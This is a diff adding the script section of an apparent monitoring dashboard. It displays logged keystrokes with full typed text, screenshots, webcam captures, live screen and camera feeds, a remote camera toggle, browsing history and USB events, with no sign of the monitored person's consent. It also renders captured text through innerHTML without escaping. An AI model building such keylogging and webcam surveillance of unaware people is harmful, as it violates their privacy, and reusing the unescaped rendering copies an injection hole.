+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
+    <script src="https://cdn.datatables.net/1.11.5/js/dataTables.bootstrap5.min.js"></script>
+    
+    <!-- Add Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+    <!-- Core functionality scripts -->
+    <script>
+        // Update clock
+        function updateClock() {
+            document.getElementById('clock').textContent = new Date().toLocaleString();
+        }
+        setInterval(updateClock, 1000);
+        updateClock();
+
+        // Navigation
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                // Update active states
+                document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+                this.classList.add('active');
+                // Show corresponding section
+                const section = this.getAttribute('data-section');
+                document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
+                document.getElementById(`${section}-section`).classList.add('active');
+            });
+        });
+
+        // Initialize tables object globally
+        let tables = {};
+
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set default date-time values
+            const now = new Date();
+            const today = now.toISOString().split('T')[0];
+            const startOfDay = '00:00';
+            const currentTime = now.getHours().toString().padStart(2, '0') + ':' + 
+                               now.getMinutes().toString().padStart(2, '0');
+
+            document.getElementById('fromDate').value = today;
+            document.getElementById('toDate').value = today;
+            document.getElementById('fromTime').value = startOfDay;
+            document.getElementById('toTime').value = currentTime;
+
+            // Initialize DataTables
+            initializeTables();
+            
+            // Load initial data
+            loadScreenshots();
+            loadWebcam();
+        });
+
+        function initializeTables() {
+            // Initialize apps table first
+            if ($.fn.DataTable.isDataTable('#apps-table')) {
+                $('#apps-table').DataTable().destroy();
+            }
+
+            tables.apps = $('#apps-table').DataTable({
+                ajax: {
+                    url: '/api/apps',
+                    dataSrc: 'data'
+                },
+                columns: [
+                    { data: 0, title: 'Application' },
+                    { data: 1, title: 'Total Time' },
+                    { data: 2, title: 'Last Used' }
+                ],
+                pageLength: 25,
+                order: [[1, 'desc']],  // Sort by duration by default
+                responsive: true,
+                language: {
+                    emptyTable: "No application usage data available"
+                },
+                dom: '<"row"<"col-sm-12 col-md-6"l><"col-sm-12 col-md-6"f>>' +
+                     '<"row"<"col-sm-12"tr>>' +
+                     '<"row"<"col-sm-12 col-md-5"i><"col-sm-12 col-md-7"p>>'
+            });
+
+            // Initialize internet table
+            if ($.fn.DataTable.isDataTable('#internet-table')) {
+                $('#internet-table').DataTable().destroy();
+            }
+
+            tables.internet = $('#internet-table').DataTable({
+                ajax: {
+                    url: '/api/internet',
+                    data: function(d) {
+                        return {
+                            ...d,
+                            fromDate: document.getElementById('fromDate').value,
+                            fromTime: document.getElementById('fromTime').value,
+                            toDate: document.getElementById('toDate').value,
+                            toTime: document.getElementById('toTime').value
+                        };
+                    }
+                },
+                columns: [
+                    { data: 0 },  // Application
+                    { data: 1 },  // Data Sent
+                    { data: 2 },  // Data Received
+                    { data: 3 }   // Total Usage
+                ],
+                pageLength: 25,
+                order: [[3, 'desc']],  // Sort by total usage
+                responsive: true,
+                language: {
+                    emptyTable: "No internet usage data available"
+                }
+            });
+
+            // Initialize website table
+            if ($.fn.DataTable.isDataTable('#website-table')) {
+                $('#website-table').DataTable().destroy();
+            }
+
+            tables.website = $('#website-table').DataTable({
+                ajax: {
+                    url: '/api/website',
+                    data: function(d) {
+                        return {
+                            ...d,
+                            fromDate: document.getElementById('fromDate').value,
+                            fromTime: document.getElementById('fromTime').value,
+                            toDate: document.getElementById('toDate').value,
+                            toTime: document.getElementById('toTime').value
+                        };
+                    }
+                },
+                columns: [
+                    { data: 0 },  // Time
+                    { data: 2 },  // Website (URL)
+                    { data: "1" }, // Duration (default to 1 minute)
+                    { data: 1 }   // Browser
+                ],
+                columnDefs: [
+                    {
+                        targets: 2,
+                        render: function(data, type, row) {
+                            return "1 minute";  // Default duration
+                        }
+                    }
+                ],
+                pageLength: 25,
+                order: [[0, 'desc']],  // Sort by time by default
+                responsive: true,
+                language: {
+                    emptyTable: "No website history available"
+                }
+            });
+
+            // Initialize other tables
+            const otherTables = {
+                'activity': '#activity-table',
+                'usb': '#usb-table'
+            };
+
+            Object.entries(otherTables).forEach(([key, selector]) => {
+                if ($.fn.DataTable.isDataTable(selector)) {
+                    $(selector).DataTable().destroy();
+                }
+
+                tables[key] = $(selector).DataTable({
+                    ajax: {
+                        url: `/api/${key}`,
+                        data: function(d) {
+                            return {
+                                ...d,
+                                fromDate: document.getElementById('fromDate').value,
+                                fromTime: document.getElementById('fromTime').value,
+                                toDate: document.getElementById('toDate').value,
+                                toTime: document.getElementById('toTime').value
+                            };
+                        }
+                    },
+                    pageLength: 25,
+                    order: [[0, 'desc']],
+                    responsive: true
+                });
+            });
+
+            // Initialize keystrokes table
+            if ($.fn.DataTable.isDataTable('#keystrokes-table')) {
+                $('#keystrokes-table').DataTable().destroy();
+            }
+
+            tables.keystrokes = $('#keystrokes-table').DataTable({
+                ajax: {
+                    url: '/api/keystrokes',
+                    data: function(d) {
+                        return {
+                            ...d,
+                            fromDate: document.getElementById('fromDate').value,
+                            fromTime: document.getElementById('fromTime').value,
+                            toDate: document.getElementById('toDate').value,
+                            toTime: document.getElementById('toTime').value
+                        };
+                    }
+                },
+                columns: [
+                    {
+                        className: 'dt-control',
+                        orderable: false,
+                        data: null,
+                        defaultContent: '<i class="fas fa-plus-circle text-primary"></i>'
+                    },
+                    { data: 0 },  // Date
+                    { data: 1 },  // Application
+                    { data: 2 }   // Key Count
+                ],
+                order: [[2, 'desc']],  // Sort by key count by default
+                pageLength: 25,
+                responsive: true
+            });
+
+            // Add event listener for expanding/collapsing rows
+            $('#keystrokes-table tbody').on('click', 'td.dt-control', function() {
+                const tr = $(this).closest('tr');
+                const row = tables.keystrokes.row(tr);
+                const icon = $(this).find('i');
+                
+                if (row.child.isShown()) {
+                    // This row is already open - close it
+                    row.child.hide();
+                    tr.removeClass('shown');
+                    icon.removeClass('fa-minus-circle').addClass('fa-plus-circle');
+                } else {
+                    // Get the text content data
+                    const appName = row.data()[1];
+                    
+                    // Show loading state
+                    icon.removeClass('fa-plus-circle').addClass('fa-spinner fa-spin');
+                    
+                    // Make an AJAX call to get the text content
+                    $.ajax({
+                        url: '/api/keystroke_content',
+                        data: {
+                            application: appName,
+                            fromDate: document.getElementById('fromDate').value,
+                            fromTime: document.getElementById('fromTime').value,
+                            toDate: document.getElementById('toDate').value,
+                            toTime: document.getElementById('toTime').value
+                        },
+                        success: function(data) {
+                            let content;
+                            if (data.content && data.content.length > 0) {
+                                content = '<div class="p-3">';
+                                content += '<h6 class="mb-3">Typed Content:</h6>';
+                                content += '<div class="text-content">';
+                                data.content.forEach(function(text) {
+                                    content += `
+                                        <div class="text-entry mb-3">
+                                            <div class="text-muted small mb-1">${text.timestamp}</div>
+                                            <div class="border rounded p-2 bg-light">${text.content}</div>
+                                        </div>`;
+                                });
+                                content += '</div></div>';
+                            } else {
+                                content = '<div class="p-3 text-muted">No text content available for this application.</div>';
+                            }
+                            
+                            // Show the content
+                            row.child(content).show();
+                            tr.addClass('shown');
+                            
+                            // Update icon
+                            icon.removeClass('fa-spinner fa-spin').addClass('fa-minus-circle');
+                        },
+                        error: function() {
+                            // Show error message
+                            row.child('<div class="p-3 text-danger">Error loading keystroke content.</div>').show();
+                            tr.addClass('shown');
+                            
+                            // Update icon
+                            icon.removeClass('fa-spinner fa-spin').addClass('fa-minus-circle');
+                        }
+                    });
+                }
+            });
+
+            // Add styles for the expand/collapse icons
+            $('<style>')
+                .text(`
+                    td.dt-control {
+                        cursor: pointer;
+                        text-align: center;
+                    }
+                    td.dt-control i {
+                        font-size: 1.2em;
+                    }
+                    .text-entry {
+                        border-left: 3px solid #e9ecef;
+                        padding-left: 1rem;
+                    }
+                    .text-content {
+                        max-height: 300px;
+                        overflow-y: auto;
+                    }
+                `)
+                .appendTo('head');
+        }
+
+        function applyFilters() {
+            // Refresh all tables
+            Object.values(tables).forEach(table => {
+                if (table && typeof table.ajax === 'function') {
+                    table.ajax.reload(null, false);
+                }
+            });
+
+            // Refresh screenshots and webcam
+            loadScreenshots();
+            loadWebcam();
+        }
+
+        // Load screenshots
+        function loadScreenshots() {
+            const fromDate = document.getElementById('fromDate').value;
+            const fromTime = document.getElementById('fromTime').value;
+            const toDate = document.getElementById('toDate').value;
+            const toTime = document.getElementById('toTime').value;
+
+            const params = new URLSearchParams({
+                fromDate: fromDate,
+                fromTime: fromTime,
+                toDate: toDate,
+                toTime: toTime
+            });
+
+            fetch(`/api/screenshots?${params.toString()}`)
+                .then(response => response.json())
+                .then(data => {
+                    const grid = document.getElementById('screenshot-grid');
+                    if (data.screenshots && data.screenshots.length > 0) {
+                        grid.innerHTML = data.screenshots.map(screenshot => `
+                            <div class="col-md-4 mb-4">
+                                <div class="card">
+                                    <img src="${screenshot.url}" class="card-img-top" alt="Screenshot" 
+                                         onclick="showImage(this.src, '${screenshot.timestamp}')">
+                                    <div class="card-body">
+                                        <p class="card-text small text-muted">${screenshot.timestamp}</p>
+                                    </div>
+                                </div>
+                            </div>
+                        `).join('');
+                    } else {
+                        grid.innerHTML = '<div class="col-12"><div class="alert alert-info">No screenshots found for the selected time range.</div></div>';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading screenshots:', error);
+                    document.getElementById('screenshot-grid').innerHTML = 
+                        '<div class="col-12"><div class="alert alert-danger">Error loading screenshots.</div></div>';
+                });
+        }
+
+        // Load webcam captures
+        function loadWebcam() {
+            const fromDate = document.getElementById('fromDate').value;
+            const fromTime = document.getElementById('fromTime').value;
+            const toDate = document.getElementById('toDate').value;
+            const toTime = document.getElementById('toTime').value;
+
+            const params = new URLSearchParams({
+                fromDate: fromDate,
+                fromTime: fromTime,
+                toDate: toDate,
+                toTime: toTime
+            });
+
+            fetch(`/api/webcam?${params.toString()}`)
+                .then(response => response.json())
+                .then(data => {
+                    const grid = document.getElementById('webcam-grid');
+                    if (data.captures && data.captures.length > 0) {
+                        grid.innerHTML = data.captures.map(capture => `
+                            <div class="col-md-4 mb-4">
+                                <div class="card">
+                                    <img src="${capture.url}" class="card-img-top" alt="Webcam Capture"
+                                         onclick="showImage(this.src, '${capture.timestamp}')">
+                                    <div class="card-body">
+                                        <p class="card-text small text-muted">${capture.timestamp}</p>
+                                    </div>
+                                </div>
+                            </div>
+                        `).join('');
+                    } else {
+                        grid.innerHTML = '<div class="col-12"><div class="alert alert-info">No webcam captures found for the selected time range.</div></div>';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading webcam captures:', error);
+                    document.getElementById('webcam-grid').innerHTML = 
+                        '<div class="col-12"><div class="alert alert-danger">Error loading webcam captures.</div></div>';
+                });
+        }
+
+        // Image modal functionality
+        const modal = document.getElementById('imageModal');
+        const modalImg = document.getElementById('modalImage');
+        const modalTimestamp = document.getElementById('modalTimestamp');
+        const closeBtn = document.getElementsByClassName('close')[0];
+
+        function showImage(src, timestamp) {
+            modal.style.display = 'block';
+            modalImg.src = src;
+            modalTimestamp.textContent = timestamp;
+        }
+
+        closeBtn.onclick = function() {
+            modal.style.display = 'none';
+        }
+
+        modal.onclick = function(event) {
+            if (event.target === modal) {
+                modal.style.display = 'none';
+            }
+        }
+
+        // Auto-refresh every 30 seconds
+        setInterval(applyFilters, 30000);
+
+        // Initial load
+        loadScreenshots();
+        loadWebcam();
+
+        // Track connection status and retry attempts
+        const streamStatus = {
+            screen: { connected: false, retryCount: 0, maxRetries: 5 },
+            camera: { connected: false, retryCount: 0, maxRetries: 5, enabled: false }
+        };
+
+        // Update status indicator and tooltip
+        function updateStatus(type, status, message) {
+            const indicator = document.getElementById(`${type}-status`);
+            if (indicator) {
+                const tooltip = indicator.querySelector('.status-tooltip');
+                indicator.className = `status-indicator ${status}`;
+                if (tooltip) {
+                    tooltip.textContent = message;
+                }
+                streamStatus[type].connected = (status === 'connected');
+            }
+        }
+
+        // Handle stream errors
+        function handleStreamError(img, type) {
+            const feed = document.getElementById(`${type}-feed`);
+            const error = document.getElementById(`${type}-error`);
+            if (feed && error) {
+                const errorMessage = error.querySelector('.error-message');
+                
+                // Update status
+                updateStatus(type, 'disconnected', type === 'camera' ? 'Camera Off' : 'Connection failed');
+                
+                // Show error overlay for screen only, or camera if it's enabled
+                if (type === 'screen' || (type === 'camera' && streamStatus.camera.enabled)) {
+                    error.style.display = 'block';
+                    
+                    // Increment retry count
+                    streamStatus[type].retryCount++;
+                    
+                    if (streamStatus[type].retryCount <= streamStatus[type].maxRetries) {
+                        if (errorMessage) {
+                            errorMessage.textContent = `Retrying... (Attempt ${streamStatus[type].retryCount} of ${streamStatus[type].maxRetries})`;
+                        }
+                        // Auto-reconnect after delay (increasing with each retry)
+                        setTimeout(() => reconnectStream(type), 2000 * streamStatus[type].retryCount);
+                    } else {
+                        if (errorMessage) {
+                            errorMessage.textContent = 'Maximum retry attempts reached. Please try manual reconnection.';
+                        }
+                    }
+                }
+            }
+        }
+
+        // Reconnect stream
+        function reconnectStream(type) {
+            if (type === 'camera' && !streamStatus.camera.enabled) {
+                return; // Don't reconnect camera if it's disabled
+            }
+
+            const img = type === 'camera' ? document.getElementById('camera-feed-img') : document.querySelector(`#${type}-feed img`);
+            const error = document.getElementById(`${type}-error`);
+            if (img && error) {
+                // Update status to connecting
+                updateStatus(type, 'connecting', type === 'camera' ? 'Connecting camera...' : 'Connecting...');
+                
+                // Hide error overlay
+                error.style.display = 'none';
+                
+                // Update source with timestamp to force reload
+                img.src = `/live/${type}_feed?t=${Date.now()}`;
+            }
+        }
+
+        // Toggle camera feed
+        const toggleCameraBtn = document.getElementById('toggleCamera');
+        const cameraFeedImg = document.getElementById('camera-feed-img');
+        const cameraPlaceholder = document.getElementById('camera-placeholder');
+
+        toggleCameraBtn.addEventListener('click', function() {
+            const willEnable = !streamStatus.camera.enabled;
+            
+            // Call API to toggle camera
+            fetch('/api/camera/toggle', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    enabled: willEnable
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    streamStatus.camera.enabled = willEnable;
+                    
+                    if (willEnable) {
+                        // Turn camera on
+                        toggleCameraBtn.innerHTML = '<i class="fas fa-video-slash"></i> Turn Camera Off';
+                        cameraPlaceholder.style.display = 'none';
+                        cameraFeedImg.style.display = 'block';
+                        reconnectStream('camera');
+                    } else {
+                        // Turn camera off
+                        toggleCameraBtn.innerHTML = '<i class="fas fa-video"></i> Turn Camera On';
+                        cameraFeedImg.style.display = 'none';
+                        cameraPlaceholder.style.display = 'block';
+                        updateStatus('camera', 'disconnected', 'Camera Off');
+                        document.getElementById('camera-error').style.display = 'none';
+                        // Clear the image source to stop the video feed
+                        cameraFeedImg.src = '';
+                    }
+                } else {
+                    console.error('Failed to toggle camera:', data.error);
+                    alert('Failed to toggle camera. Please try again.');
+                }
+            })
+            .catch(error => {
+                console.error('Error toggling camera:', error);
+                alert('Error toggling camera. Please try again.');
+            });
+        });
+
+        // Toggle Picture-in-Picture
+        function togglePiP() {
+            const pipFeed = document.getElementById('camera-feed');
+            pipFeed.classList.toggle('expanded');
+        }
+
+        // Toggle Fullscreen
+        function toggleFullscreen(elementId) {
+            const element = document.getElementById(elementId);
+            element.classList.toggle('fullscreen');
+            const icon = element.querySelector('.fa-expand');
+            icon.classList.toggle('fa-expand');
+            icon.classList.toggle('fa-compress');
+        }
+
+        // Initialize when live section becomes active
+        document.addEventListener('DOMContentLoaded', function() {
+            const navLinks = document.querySelectorAll('.nav-link');
+            navLinks.forEach(link => {
+                link.addEventListener('click', function(e) {
+                    const section = this.getAttribute('data-section');
+                    if (section === 'live') {
+                        // Initialize screen stream only
+                        reconnectStream('screen');
+                    } else if (streamStatus.camera.enabled) {
+                        // Turn off camera when leaving live section
+                        toggleCameraBtn.click();
+                    }
+                });
+            });
+
+            // Check connection status periodically when live section is active
+            setInterval(() => {
+                const liveSection = document.getElementById('live-section');
+                if (liveSection && liveSection.classList.contains('active')) {
+                    checkImageLoading('screen');
+                    if (streamStatus.camera.enabled) {
+                        checkImageLoading('camera');
+                    }
+                }
+            }, 1000);
+        });
+    </script>
+
+    <!-- Dashboard JavaScript -->
+    <script>
+        let appUsageChart = null;
+        let internetUsageChart = null;
+
+        // Initialize charts
+        function initializeCharts() {
+            // App Usage Chart
+            const appCtx = document.getElementById('appUsageChart').getContext('2d');
+            appUsageChart = new Chart(appCtx, {
+                type: 'doughnut',
+                data: {
+                    labels: [],
+                    datasets: [{
+                        data: [],
+                        backgroundColor: [
+                            '#4e73df', // Blue
+                            '#1cc88a', // Green
+                            '#36b9cc', // Cyan
+                            '#f6c23e', // Yellow
+                            '#e74a3b', // Red
+                            '#858796'  // Gray for Others
+                        ],
+                        borderWidth: 1,
+                        borderColor: '#ffffff'
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: {
+                            position: 'right',
+                            labels: {
+                                padding: 20,
+                                usePointStyle: true,
+                                font: {
+                                    size: 12
+                                },
+                                generateLabels: function(chart) {
+                                    const data = chart.data;
+                                    if (data.labels.length && data.datasets.length) {
+                                        const dataset = data.datasets[0];
+                                        const total = dataset.data.reduce((acc, value) => acc + value, 0);
+                                        
+                                        return data.labels.map((label, i) => {
+                                            const value = dataset.data[i];
+                                            const percentage = ((value / total) * 100).toFixed(1);
+                                            return {
+                                                text: `${label} (${percentage}%)`,
+                                                fillStyle: dataset.backgroundColor[i],
+                                                strokeStyle: dataset.borderColor,
+                                                lineWidth: dataset.borderWidth,
+                                                hidden: isNaN(dataset.data[i]) || dataset.data[i] === 0,
+                                                index: i
+                                            };
+                                        });
+                                    }
+                                    return [];
+                                }
+                            },
+                            tooltip: {
+                                callbacks: {
+                                    label: function(context) {
+                                        const label = context.label || '';
+                                        const minutes = Math.round(context.parsed);
+                                        
+                                        // Convert to hours and minutes
+                                        const hours = Math.floor(minutes / 60);
+                                        const remainingMinutes = minutes % 60;
+                                        
+                                        let timeStr;
+                                        if (hours > 0) {
+                                            timeStr = `${hours} hour${hours > 1 ? 's' : ''}`;
+                                            if (remainingMinutes > 0) {
+                                                timeStr += ` ${remainingMinutes} minute${remainingMinutes > 1 ? 's' : ''}`;
+                                            }
+                                        } else if (minutes > 0) {
+                                            timeStr = `${minutes} minute${minutes > 1 ? 's' : ''}`;
+                                        } else {
+                                            timeStr = 'Less than a minute';
+                                        }
+                                        
+                                        return `${label}: ${timeStr}`;
+                                    }
+                                }
+                            }
+                        },
+                        title: {
+                            display: true,
+                            text: 'Time Spent (minutes)',
+                            padding: {
+                                top: 10,
+                                bottom: 20
+                            }
+                        }
+                    },
+                    cutout: '65%',
+                    animation: {
+                        animateScale: true,
+                        animateRotate: true
+                    }
+                }
+            });
+
+            // Internet Usage Chart
+            const internetCtx = document.getElementById('internetUsageChart').getContext('2d');
+            internetUsageChart = new Chart(internetCtx, {
+                type: 'bar',
+                data: {
+                    labels: [],
+                    datasets: [{
+                        label: 'Data Sent',
+                        data: [],
+                        backgroundColor: '#0d6efd',
+                        borderWidth: 1
+                    }, {
+                        label: 'Data Received',
+                        data: [],
+                        backgroundColor: '#198754',
+                        borderWidth: 1
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    scales: {
+                        y: {
+                            beginAtZero: true,
+                            title: {
+                                display: true,
+                                text: 'Data Usage (MB)'
+                            }
+                        }
+                    },
+                    plugins: {
+                        legend: {
+                            position: 'top'
+                        }
+                    }
+                }
+            });
+        }
+
+        // Update monitor toggle status
+        function updateMonitorStatus(id, status) {
+            const toggle = document.getElementById(id);
+            const statusPill = toggle.closest('.monitor-toggle').querySelector('.status-pill');
+            
+            if (status) {
+                statusPill.classList.remove('inactive');
+                statusPill.classList.add('active');
+                statusPill.textContent = 'Active';
+            } else {
+                statusPill.classList.remove('active');
+                statusPill.classList.add('inactive');
+                statusPill.textContent = 'Inactive';
+            }
+
+            // Send status to server
+            fetch('/api/monitor/toggle', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    monitor: id.replace('Toggle', '').toLowerCase(),
+                    enabled: status
+                })
+            }).catch(error => {
+                console.error('Error updating monitor status:', error);
+                // Revert toggle if server update fails
+                toggle.checked = !status;
+                updateMonitorStatus(id, !status);
+            });
+        }
+
+        // Add event listeners to toggles
+        document.querySelectorAll('.form-check-input').forEach(toggle => {
+            toggle.addEventListener('change', function() {
+                updateMonitorStatus(this.id, this.checked);
+            });
+        });
+
+        // Update timeline
+        function updateTimeline() {
+            fetch('/api/dashboard/recent_activity')
+                .then(response => response.json())
+                .then(data => {
+                    const timeline = document.getElementById('activityTimeline');
+                    timeline.innerHTML = data.activities.map(activity => `
+                        <div class="timeline-item">
+                            <div class="timeline-content">
+                                <div class="text-muted small">${activity.timestamp}</div>
+                                <div>${activity.details}</div>
+                            </div>
+                        </div>
+                    `).join('');
+                })
+                .catch(error => {
+                    console.error('Error updating timeline:', error);
+                });
+        }
+
+        // Update latest captures
+        function updateLatestCaptures() {
+            fetch('/api/dashboard/latest_captures')
+                .then(response => response.json())
+                .then(data => {
+                    const captures = document.getElementById('latestCaptures');
+                    captures.innerHTML = data.captures.map(capture => `
+                        <div class="capture-item">
+                            <img src="${capture.url}" alt="${capture.type}" 
+                                 onclick="showImage(this.src, '${capture.timestamp}')">
+                            <div class="capture-time">
+                                <i class="fas fa-${capture.type === 'screenshot' ? 'desktop' : 'camera'}"></i>
+                                ${capture.timestamp}
+                            </div>
+                        </div>
+                    `).join('');
+                })
+                .catch(error => {
+                    console.error('Error updating captures:', error);
+                });
+        }
+
+        // Update quick stats
+        function updateQuickStats() {
+            fetch('/api/dashboard/stats')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('websiteCount').textContent = data.website_count;
+                    document.getElementById('appCount').textContent = data.app_count;
+                    document.getElementById('activeTime').textContent = data.active_time;
+                })
+                .catch(error => {
+                    console.error('Error updating quick stats:', error);
+                });
+        }
+
+        // Update app usage chart
+        function updateAppUsageChart() {
+            const noDataMessage = document.getElementById('appUsageNoData');
+            const loader = document.getElementById('appUsageLoader');
+            
+            // Show loader
+            loader.style.display = 'flex';
+            noDataMessage.style.display = 'none';
+            
+            fetch('/api/dashboard/app_usage')
+                .then(response => response.json())
+                .then(data => {
+                    loader.style.display = 'none';
+                    
+                    if (data.labels && data.labels.length > 0 && data.data && data.data.length > 0) {
+                        appUsageChart.data.labels = data.labels;
+                        appUsageChart.data.datasets[0].data = data.data;
+                        appUsageChart.update();
+                        noDataMessage.style.display = 'none';
+                    } else {
+                        appUsageChart.data.labels = [];
+                        appUsageChart.data.datasets[0].data = [];
+                        appUsageChart.update();
+                        noDataMessage.style.display = 'flex';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error updating app usage chart:', error);
+                    loader.style.display = 'none';
+                    noDataMessage.style.display = 'flex';
+                    appUsageChart.data.labels = [];
+                    appUsageChart.data.datasets[0].data = [];
+                    appUsageChart.update();
+                });
+        }
+
+        // Update internet usage chart
+        function updateInternetUsageChart() {
+            fetch('/api/internet')
+                .then(response => response.json())
+                .then(data => {
+                    const apps = data.data.slice(0, 10); // Get top 10 apps
+                    internetUsageChart.data.labels = apps.map(app => app[0]);
+                    internetUsageChart.data.datasets[0].data = apps.map(app => convertToMB(app[1]));
+                    internetUsageChart.data.datasets[1].data = apps.map(app => convertToMB(app[2]));
+                    internetUsageChart.update();
+                })
+                .catch(error => {
+                    console.error('Error updating internet usage chart:', error);
+                });
+        }
+
+        // Convert size string to MB
+        function convertToMB(sizeStr) {
+            const units = {'B': 1, 'KB': 1024, 'MB': 1024*1024, 'GB': 1024*1024*1024};
+            const [size, unit] = sizeStr.split(' ');
+            const bytes = parseFloat(size) * units[unit];
+            return Math.round(bytes / (1024 * 1024) * 100) / 100; // Convert to MB with 2 decimal places
+        }
+
+        // Update all dashboard components
+        function updateDashboard() {
+            updateQuickStats();
+            updateAppUsageChart();
+            updateInternetUsageChart();
+            updateTimeline();
+            updateLatestCaptures();
+        }
+
+        // Initialize home dashboard
+        document.addEventListener('DOMContentLoaded', function() {
+            // Initialize charts
+            initializeCharts();
+            
+            // Update dashboard with initial data
+            updateDashboard();
+
+            // Set up auto-refresh
+            setInterval(() => {
+                if (document.getElementById('home-section').classList.contains('active')) {
+                    updateDashboard();
+                }
+            }, 30000);
+
+            // Update charts when window is resized
+            window.addEventListener('resize', function() {
+                if (appUsageChart) {
+                    appUsageChart.resize();
+                }
+                if (internetUsageChart) {
+                    internetUsageChart.resize();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
